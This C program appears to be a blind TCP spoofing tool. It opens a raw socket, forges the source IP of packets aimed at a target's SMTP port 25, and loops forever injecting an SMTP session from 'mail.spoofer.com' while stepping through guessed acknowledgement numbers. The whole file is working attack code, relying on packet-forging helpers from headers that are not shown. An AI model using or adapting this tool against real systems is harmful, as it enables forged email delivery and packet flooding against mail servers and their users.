#include "include/socketManager.h"
#include "include/packetForger.h"
#include "include/str_replace.h"
#include <fcntl.h>
#include <stdlib.h>
#include <errno.h>
#include <stdbool.h>
#include <time.h>
#include <stdio.h>
#include <string.h>



int main(int argc, char **argv) {

    time_t mytime = time(NULL);
    char * time_str = ctime(&mytime);
    time_str[strlen(time_str)-1] = '\0';
    printf("Current Time : %s\n", time_str);


    char* email_channel_payload_template = "EHLO mail.spoofer.com\r\nMAIL FROM:<[ack]@mail.spoofer.com>\r\nRCPT TO:<incoming@mail.target.com>\r\nDATA\r\nFrom:[ack]@mail.spoofer.com\r\nTo:incoming@mail.target.com\r\nSubject:test email\r\n\r\nThis is test email body\r\n.\r\n";
    char *srcip = ""; // forged src
    char *dstip = ""; // target ip
    
    int src_port = 49884;
    int seq = 1;
    char s_ack[16];

    u_int32_t ack_number = 13338;


    int sock = socket(AF_INET, SOCK_RAW, IPPROTO_TCP);
    // fcntl(sock, F_SETFL, O_NONBLOCK);

    int one = 1;
    const int *val = &one;
    if(setsockopt(sock, IPPROTO_IP, IP_HDRINCL, val, sizeof(one))<0){
        printf ("Error setting IP_HDRINCL. Error number : %d . Error message : %s \n" , errno , strerror(errno));
	    exit(0);
    }


    while(true){
    	sprintf(s_ack, "%u", ack_number);
        char *email_channel_payload = str_replace(email_channel_payload_template,"[ack]",s_ack);
        
        rawsocket_send(sock, build_tcp_packet(src_port, 25, srcip, dstip, seq, ack_number, 512, PSH | ACK, email_channel_payload));
        ack_number = ack_number + 13337;
	    free(email_channel_payload);

    }

}